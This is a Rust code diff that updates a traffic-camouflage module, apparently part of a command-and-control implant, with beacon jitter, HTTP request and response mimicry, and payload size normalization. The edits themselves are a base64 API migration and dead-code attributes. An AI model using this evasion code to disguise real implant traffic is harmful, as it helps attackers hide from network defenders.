@@ -2,6 +2,7 @@ use hmac::{Hmac, Mac};
 use rand::Rng;
 use sha2::Sha256;
 use log::debug;
+use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 
 type HmacSha256 = Hmac<Sha256>;
 
@@ -47,6 +48,7 @@ impl BeaconJitter {
 
 // ============ HTTP Mimicry ============
 
+#[allow(dead_code)]
 pub struct HttpMimicry {
     seed: [u8; 32],
     request_index: u64,
@@ -86,6 +88,7 @@ const CONTENT_TYPES: &[&str] = &[
     "application/octet-stream",
 ];
 
+#[allow(dead_code)]
 impl HttpMimicry {
     pub fn new(seed: &[u8; 32]) -> Self {
         Self {
@@ -110,7 +113,7 @@ impl HttpMimicry {
         let path = self.pick_from(URL_PATHS, b"path");
         let content_type = self.pick_from(CONTENT_TYPES, b"ct");
 
-        let body = base64::encode(payload);
+        let body = BASE64.encode(payload);
 
         let mut rng = rand::thread_rng();
         let method = if rng.gen_bool(0.5) { "POST" } else { "PUT" };
@@ -149,13 +152,13 @@ impl HttpMimicry {
         let body_start = text.find("\r\n\r\n")
             .ok_or("No HTTP body separator found")?;
         let body = text[body_start + 4..].trim();
-        let decoded = base64::decode(body)?;
+        let decoded = BASE64.decode(body)?;
         Ok(decoded)
     }
 
     pub fn wrap_as_http_response(&mut self, payload: &[u8]) -> Vec<u8> {
         let content_type = self.pick_from(CONTENT_TYPES, b"resp-ct");
-        let body = base64::encode(payload);
+        let body = BASE64.encode(payload);
 
         let response = format!(
             "HTTP/1.1 200 OK\r\n\
@@ -188,6 +191,7 @@ pub struct SizeNormalizer {
     target_sizes: Vec<usize>,
 }
 
+#[allow(dead_code)]
 impl SizeNormalizer {
     pub fn new() -> Self {
         Self {
@@ -245,6 +249,7 @@ impl SizeNormalizer {
 // ============ Traffic Profile ============
 
 #[derive(Clone, Debug)]
+#[allow(dead_code)]
 pub enum CamouflageMode {
     None,
     HttpMimicry,
@@ -252,6 +257,7 @@ pub enum CamouflageMode {
     Full,
 }
 
+#[allow(dead_code)]
 pub struct TrafficProfile {
     pub mode: CamouflageMode,
     pub jitter: BeaconJitter,
@@ -259,6 +265,7 @@ pub struct TrafficProfile {
     pub normalizer: SizeNormalizer,
 }
 
+#[allow(dead_code)]
 impl TrafficProfile {
     pub fn new(mode: CamouflageMode, base_interval: u64, seed: &[u8; 32]) -> Self {
         let mut jitter_seed = [0u8; 32];
